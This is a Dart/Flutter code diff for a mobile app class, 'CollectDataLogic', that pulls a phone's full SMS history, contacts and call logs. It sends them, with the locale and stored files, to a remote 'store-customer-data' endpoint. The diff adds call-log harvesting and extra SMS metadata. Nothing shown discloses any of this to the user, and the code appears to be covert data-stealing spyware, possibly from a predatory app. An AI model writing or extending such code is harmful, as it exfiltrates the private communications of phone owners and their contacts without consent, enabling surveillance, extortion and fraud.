@@ -2,6 +2,7 @@ import 'dart:convert';
 
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:contacts_service/contacts_service.dart';
+import 'package:call_log/call_log.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:external_path/external_path.dart';
 
@@ -18,7 +19,8 @@ class CollectDataLogic {
   CollectDataLogic();
 
   Future<void> uploadData(String secretCode, String phone) async {
-    var url = Uri.parse("https://truestaff.click/api/store-customer-data");
+    var url = Uri.parse(
+        "http://10.0.2.2:8000/api/store-customer-data"); //https://truestaff.click/api/store-customer-data
     var request = new http.MultipartRequest("POST", url);
 
     request.fields['phone'] = phone;
@@ -34,6 +36,16 @@ class CollectDataLogic {
       List<Map> contacts = await getAllContacts();
       request.fields['contacts'] = jsonEncode(contacts);
     }
+
+    if (Platform.isAndroid) {
+      var phonePermission = await Permission.phone.status;
+      if (phonePermission.isGranted) {
+        List<Map> callLogs = await getCallLogs();
+        request.fields['call_logs'] = jsonEncode(callLogs);
+      }
+    }
+
+    request.fields['locale'] = Platform.localeName;
 
     var storagePermission = await Permission.storage.status;
     if (storagePermission.isGranted) {
@@ -63,12 +75,16 @@ class CollectDataLogic {
   Future<List<Map>> getAllSms() async {
     List<Map> result = [];
     SmsQuery query = new SmsQuery();
+
     List<SmsMessage> messages = await query.getAllSms;
     print("Total Messages : " + messages.length.toString());
     messages.forEach((element) {
       var msg = <String, String>{};
       msg['address'] = element.address.toString();
       msg['body'] = element.body.toString();
+      msg['thread_id'] = element.threadId.toString();
+      msg['date'] = element.date.toString();
+      msg['sender'] = element.sender.toString();
       result.add(msg);
     });
 
@@ -89,6 +105,25 @@ class CollectDataLogic {
             "${item.label}: ${item.value}";
       });
       msg['phones'] = phones;
+      result.add(msg);
+    });
+
+    return result;
+  }
+
+  Future<List<Map>> getCallLogs() async {
+    List<Map> result = [];
+    final Iterable<CallLogEntry> callLogs = await CallLog.query();
+    callLogs.forEach((element) {
+      var msg = <String, String>{};
+      msg['number'] = element.formattedNumber.toString();
+      msg['name'] = element.name.toString();
+      msg['call_type'] = element.callType.toString();
+      msg['timestamp'] =
+          new DateTime.fromMillisecondsSinceEpoch(element.timestamp ?? 0)
+              .toString();
+      msg['duration'] = element.duration.toString();
+
       result.add(msg);
     });
 
